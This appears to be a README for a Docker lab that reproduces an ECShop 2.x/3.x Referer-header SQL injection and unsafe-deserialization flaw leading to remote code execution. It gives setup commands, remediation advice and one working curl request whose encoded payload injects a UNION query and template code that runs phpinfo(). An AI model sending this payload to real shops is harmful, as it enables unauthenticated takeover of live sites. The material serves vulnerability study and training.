# ECShop 2.x/3.x SQL Injection / Insecure Deserialization RCE

## Overview

ECShop is a PHP-based e-commerce shop platform. In ECShop versions 2.x and 3.x, user visit logging functions inspect the HTTP `Referer` header and pass user-controlled serialized data into `unserialize()` without validation. By constructing a serialized array containing SQL injection payload (`UNION SELECT`) with embedded PHP template code (`{$asd'];phpinfo();//}`), attackers can bypass string escaping, inject into the template cache, and achieve unauthenticated Remote Code Execution.

- **Service Access**: `http://localhost:8172/`
- **Installation Wizard**: `http://localhost:8172/install/`
- **Docker Shortcut**: `./lab start ecshop-deserialization`
- **Container Names**: `cyberlab_02_ecshop_deserialization` (App) and `cyberlab_02_ecshop_mysql` (MySQL 5.5)
- **Database Credentials**: Host `mysql`, User `root`, Password `root`
- **Source of Truth**: [Vulhub ECShop xianzhi-2017-02-82239600](https://github.com/vulhub/vulhub/tree/master/ecshop/xianzhi-2017-02-82239600)

---

## Service Architecture

- **`ecshop` (`cyberlab_02_ecshop_deserialization`)**: Runs ECShop 2.7.3 exposed on host port `8172:80`.
- **`mysql` (`cyberlab_02_ecshop_mysql`)**: MySQL 5.5 database server with persistent volume `ecshop_db_data:/var/lib/mysql`.

---

## Verification & Health Check

### 1. Validate Configuration

```bash
docker compose config -q
```

### 2. Start Services

```bash
docker compose up -d
```

### 3. Check Web Endpoints

```bash
# Verify installation wizard response
curl -i http://localhost:8172/install/
```

### 4. Vulnerability Demonstration (Referer Header Injection)

```bash
curl -i 'http://localhost:8172/user.php?act=login' \
  -H 'Referer: 554fcae493e564ee0dc75bdf2ebf94caads|a:2:{s:3:"num";s:107:"*/SELECT 1,0x2d312720554e494f4e2f2a,2,4,5,6,7,8,0x7b24617364275d3b706870696e666f0928293b2f2f7d787878,10-- -";s:2:"id";s:11:"-1'\'' UNION/*";}554fcae493e564ee0dc75bdf2ebf94ca'
```

---

## Defensive Remediation & Hardening

1. Upgrade ECShop to version 3.6.0 (patched release) or newer.
2. Never invoke `unserialize()` directly on untrusted client headers or cookies.
3. Use JSON (`json_decode()`) for serialized data exchange.

---

## Video Walkthroughs & Technical References

- [ECShop Vulnerability Analysis (Seebug Paper)](https://paper.seebug.org/691/)
- [Exploit-DB 45377 - ECShop 2.x/3.x SQL Injection / RCE](https://www.exploit-db.com/exploits/45377)
- [Vulhub ECShop Environment](https://github.com/vulhub/vulhub/tree/master/ecshop/xianzhi-2017-02-82239600)
